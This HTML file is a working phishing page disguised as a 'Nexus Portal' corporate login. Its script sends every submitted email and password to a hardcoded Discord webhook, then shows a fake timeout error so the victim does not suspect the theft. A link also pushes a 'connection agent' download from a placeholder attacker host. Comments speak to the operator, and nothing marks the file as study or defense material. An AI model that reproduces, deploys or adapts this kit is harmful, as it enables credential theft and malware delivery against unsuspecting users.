<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nexus Portal | Secure Access</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
        body { background: #000; color: white; height: 100vh; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; margin: 0; }
        .auth-card { background: rgba(10,10,10,0.8); border: 1px solid rgba(255,255,255,0.1); padding: 3rem; border-radius: 32px; width: 350px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); }
        input { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px; padding: 12px; width: 100%; margin-bottom: 10px; box-sizing: border-box; outline: none; }
        .btn { background: #fff; color: #000; border: none; padding: 12px; border-radius: 10px; font-weight: 600; width: 100%; cursor: pointer; }
        .download-btn { color: #00a2ff; font-size: 0.8rem; display: block; margin-top: 25px; text-decoration: none; opacity: 0.6; }
    </style>
</head>
<body>
    <div class="auth-card">
        <h2>Nexus Portal</h2>
        <p style="opacity:0.5; margin-bottom: 2rem;">Authorized Personnel Only</p>
        
        <form id="loginForm">
            <input type="email" id="email" placeholder="Corporate Email" required>
            <input type="password" id="password" placeholder="Access Key" required>
            <button class="btn" type="submit">Unlock Terminal</button>
        </form>

        <a href="http://YOUR_FEDORA_IP:5000/download_agent" class="download-btn">Download Required Connection Agent (v1.0.4)</a>
    </div>

    <script>
        // This is your Discord Webhook
        const WEBHOOK = "https://discord.com/api/webhooks/1480790273364852862/p-sxWl9MwaONtPreinQHv6YH1AYpag5rEZL97u4eDgpzHikUgdb4Vyy_vgi5i5t4H8m_";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;

            // This sends the data to Discord 24/7
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔑 **New Login**\n**User:** \`${email}\`\n**Pass:** \`${pass}\``
                })
            }).then(() => {
                alert("Invalid session. Connection timed out.");
                location.reload();
            });
        });
    </script>
</body>
</html>
